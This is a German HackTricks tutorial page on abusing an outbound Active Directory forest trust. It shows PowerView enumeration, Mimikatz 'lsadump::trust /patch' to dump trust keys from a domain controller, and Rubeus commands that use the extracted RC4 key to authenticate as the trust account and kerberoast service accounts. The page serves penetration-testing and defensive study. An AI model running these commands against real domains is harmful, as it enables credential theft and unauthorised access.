# Externer Wald-Domain - Einweg (Outbound)

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

In diesem Szenario **deine Domain** **vertraut** einigen **Befugnissen** an ein Hauptobjekt aus **anderen Domains**.

## Aufzählung

### Outbound-Vertrauen
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## Trust Account Attack

Eine Sicherheitsanfälligkeit besteht, wenn eine Vertrauensbeziehung zwischen zwei Domänen hergestellt wird, hier als Domäne **A** und Domäne **B** identifiziert, wobei Domäne **B** ihr Vertrauen auf Domäne **A** ausdehnt. In diesem Setup wird ein spezielles Konto in Domäne **A** für Domäne **B** erstellt, das eine entscheidende Rolle im Authentifizierungsprozess zwischen den beiden Domänen spielt. Dieses Konto, das mit Domäne **B** verbunden ist, wird verwendet, um Tickets für den Zugriff auf Dienste über die Domänen hinweg zu verschlüsseln.

Der kritische Aspekt, den es hier zu verstehen gilt, ist, dass das Passwort und der Hash dieses speziellen Kontos von einem Domänencontroller in Domäne **A** mit einem Befehlszeilenwerkzeug extrahiert werden können. Der Befehl, um diese Aktion auszuführen, ist:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Diese Extraktion ist möglich, da das Konto, das mit einem **$** nach seinem Namen identifiziert wird, aktiv ist und zur Gruppe "Domain Users" der Domäne **A** gehört, wodurch es die mit dieser Gruppe verbundenen Berechtigungen erbt. Dies ermöglicht es Personen, sich mit den Anmeldeinformationen dieses Kontos gegen die Domäne **A** zu authentifizieren.

**Warnung:** Es ist möglich, diese Situation auszunutzen, um in der Domäne **A** als Benutzer Fuß zu fassen, wenn auch mit eingeschränkten Berechtigungen. Dieser Zugriff ist jedoch ausreichend, um eine Enumeration in der Domäne **A** durchzuführen.

In einem Szenario, in dem `ext.local` die vertrauende Domäne und `root.local` die vertrauenswürdige Domäne ist, würde ein Benutzerkonto mit dem Namen `EXT$` innerhalb von `root.local` erstellt. Durch spezifische Tools ist es möglich, die Kerberos-Vertrauensschlüssel zu dumpen, wodurch die Anmeldeinformationen von `EXT$` in `root.local` offengelegt werden. Der Befehl, um dies zu erreichen, lautet:
```bash
lsadump::trust /patch
```
Folgendes könnte man tun: Man könnte den extrahierten RC4-Schlüssel verwenden, um sich als `root.local\EXT$` innerhalb von `root.local` mit einem anderen Tool-Befehl zu authentifizieren:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Dieser Authentifizierungsschritt eröffnet die Möglichkeit, Dienste innerhalb von `root.local` zu enumerieren und sogar auszunutzen, wie zum Beispiel einen Kerberoast-Angriff durchzuführen, um Anmeldeinformationen von Dienstkonten zu extrahieren mit:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Sammeln des Klartextvertrauenspassworts

Im vorherigen Ablauf wurde der Vertrauenshash anstelle des **Klartextpassworts** verwendet (das ebenfalls **von mimikatz** **ausgelesen** wurde).

Das Klartextpasswort kann erhalten werden, indem die \[ CLEAR ]-Ausgabe von mimikatz in Hexadezimal umgewandelt und Null-Bytes ‘\x00’ entfernt werden:

![](<../../.gitbook/assets/image (938).png>)

Manchmal muss bei der Erstellung einer Vertrauensbeziehung ein Passwort vom Benutzer für das Vertrauen eingegeben werden. In dieser Demonstration ist der Schlüssel das ursprüngliche Vertrauenspasswort und daher menschenlesbar. Da der Schlüssel zyklisch ist (alle 30 Tage), wird der Klartext nicht mehr menschenlesbar sein, ist aber technisch weiterhin verwendbar.

Das Klartextpasswort kann verwendet werden, um eine reguläre Authentifizierung als das Vertrauenskonto durchzuführen, als Alternative zur Anforderung eines TGT unter Verwendung des Kerberos-Geheimschlüssels des Vertrauenskontos. Hier wird root.local von ext.local nach Mitgliedern der Domain Admins abgefragt:

![](<../../.gitbook/assets/image (792).png>)

## Referenzen

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}
